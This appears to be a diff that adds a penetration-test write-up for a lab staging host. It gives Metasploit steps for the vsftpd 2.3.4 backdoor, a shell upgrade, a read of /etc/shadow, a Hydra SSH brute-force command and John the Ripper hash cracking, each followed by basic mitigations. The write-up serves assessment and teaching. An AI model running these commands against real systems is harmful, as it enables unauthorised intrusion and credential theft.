@@ -1,0 +1,132 @@
+
+---
+
+# Exploitation Steps and Mitigation Documentation
+
+This directory documents the step-by-step offensive exploitation actions taken during the security assessment of the staging environment, immediately followed by the specific defensive mitigations deployed to secure the ho
+## 1. Remote Daemon Exploitation (VSFTPD v2.3.4)
+
+### Exploitation Steps
+
+1. Initialized the Metasploit Framework on the Kali Linux asset by executing `msfconsole`.
+2. Loaded the target exploit module into memory:
+```bash
+use exploit/unix/ftp/vsftpd_234_backdoor
+
+```
+
+
+3. Target destination variable binding was executed by mapping the victim host IP address:
+```bash
+set RHOSTS 192.168.56.101
+
+```
+
+
+4. Launched the attack routine by running `exploit`. This triggered the historical application backdoor, delivering an unauthenticated interactive root command shell callback wrapper.
+5. Upgraded the basic command stream into a full interactive TTY terminal using a python inline script:
+```bash
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+```
+
+
+6. Exfiltrated the system credential database depository strings by reading the shadow storage file:
+```bash
+cat /etc/shadow
+
+```
+
+
+
+### Defensive Mitigations
+
+* **Service Termination:** Stopped the active running vulnerability process immediately:
+```bash
+sudo systemctl stop vsftpd
+
+```
+
+
+* **Boot Minimization:** Disabled the application wrapper completely from the system boot manager tables to prevent automatic execution during system startups:
+```bash
+sudo systemctl disable vsftpd
+
+```
+
+
+
+---
+
+## 2. Password Infrastructure Attacks (SSH Brute-Forcing & Cracking)
+
+### Exploitation Steps
+
+1. Launched an automated dictionary brute-force login attack against the target's open SSH Port 22 using THC-Hydra.
+2. Handled older target protocol negotiation restrictions by applying explicit legacy key-exchange overrides (`ssh-rsa`), and cross-matched the `rockyou.txt` password dictionary wordlist to isolate valid administrator access credentials:
+```bash
+HYDRA_SSH_EXTRA="-o HostKeyAlgorithms=+ssh-rsa,ssh-dss -o KexAlgorithms=+diffie-hellman-group1-sha1" hydra -t 4 -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.101
+
+```
+
+
+3. Copied the exfiltrated root user hash value string gathered during the Metasploit stage into a local file named `target_hash.txt`.
+4. Deployed John the Ripper to run offline cryptographic dictionary matching loops against the local hash text file to crack its encryption back into plain text:
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt target_hash.txt
+
+```
+
+
+
+### Defensive Mitigations
+
+* **Network Isolation Firewall (UFW):** Deployed a stateful packet-filtering firewall using an absolute default-deny incoming communication rule to block all external port scanning and unauthorized automated login attempts:
+```bash
+sudo apt install ufw -y
+sudo ufw default deny incoming
+sudo ufw default allow outgoing
+
+```
+
+
+* **Exposing Explicit Channels:** Allowed access exclusively over necessary web pipelines while keeping management ports like SSH blocked from public visibility:
+```bash
+sudo ufw allow 80/tcp
+sudo ufw allow 443/tcp
+sudo ufw enable
+
+```
+
+
+
+---
+
+## 3. Static Binary Integrity Auditing
+
+### Assessment Steps
+
+1. Conducted non-runtime analysis parameters against a target sample file wrapper (`sample_file.exe`) inside an isolated folder environment.
+2. Ran the `file` command to interrogate the true compiler architecture and header signatures of the application binary block.
+3. Executed the `strings` parser tool to safely extract cleartext text blocks, successfully exposing hidden internal Indicators of Compromise (IoCs) and a simulated external command-and-control (C2) domain link without running the binary:
+```bash
+strings sample_file.exe
+
+```
+
+
+4. Generated an unalterable SHA-256 cryptographic hash fingerprint utility string to catalog the file identity for threat database verification routines:
+```bash
+sha256sum sample_file.exe
+
+```
+
+
+
+### Defensive Mitigations
+
+* **Package Upgrade Deployment:** Updated the system repositories and applied core security upgrades across application packages to patch software dependencies and erase operational bug loops:
+```bash
+sudo apt update && sudo apt upgrade -y
+
+```
